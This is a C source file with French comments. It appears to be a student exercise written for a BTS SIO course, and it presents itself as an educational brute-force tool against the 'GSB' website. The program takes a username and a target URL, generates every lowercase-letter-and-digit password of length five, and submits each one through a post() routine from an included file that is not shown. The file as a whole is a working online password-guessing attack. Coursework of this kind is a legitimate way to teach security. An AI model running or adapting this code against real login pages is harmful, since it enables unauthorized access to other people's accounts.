#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "post.c"

// Dans cette situation, on sait que le mot de passe ne contient que des lettres en minuscules et des chiffres.
// Pour ajouter d'autres caractères il suffit de modifier cet array.
static const char alphabet[] =
"abcdefghijklmnopqrstuvwxyz"
"0123456789";

char login[20];
char urlCible[100];

static const int alphabetSize = sizeof(alphabet) - 1;

void bruteImpl(char* str, int index, int maxDepth)
{
    for (int i = 0; i < alphabetSize; ++i)
    {
        str[index] = alphabet[i];

        if (index == maxDepth - 1)
        {
            printf("test pour le mot de passe : %s\n", str);

            // On passe les informations au programme de post.c
            post(login, str, urlCible);
        }
        else bruteImpl(str, index + 1, maxDepth);
    }
}

void bruteSequential(int maxLen)
{
    char* buf = malloc(maxLen + 1);

    // Si on veut commencer à 'a', il faut mettre i = 1.
    // Si on veut commencer direct à 'aaaaa', i = 5, etc.
    for (int i = 5; i <= maxLen; ++i)
    {
        memset(buf, 0, maxLen + 1);
        bruteImpl(buf, 0, i);
    }

    free(buf);
}

// Main du programme
int main(void)
{
    printf("Bienvenue dans le programme de bruteforce du site GSB.\nIl s'agit d'un programme à but purement éducatif. Merci de ne pas le modifier.\n");
    printf("Caroline Jaffré - 2SIO\n");
    printf("Entrez le login de la personne :\n");
    scanf("%s", login);
    printf("Entrez l'URL ciblée (accessible qu'en tant que connecté)\n");
    scanf("%s", urlCible);

    // Le chiffre passé en paramètre indique la longueur du mot de passe à chercher.
    bruteSequential(5);

    printf("Aucun mot de passe n'a été trouvé. Essayez d'autres paramètres.");
    return 0;
}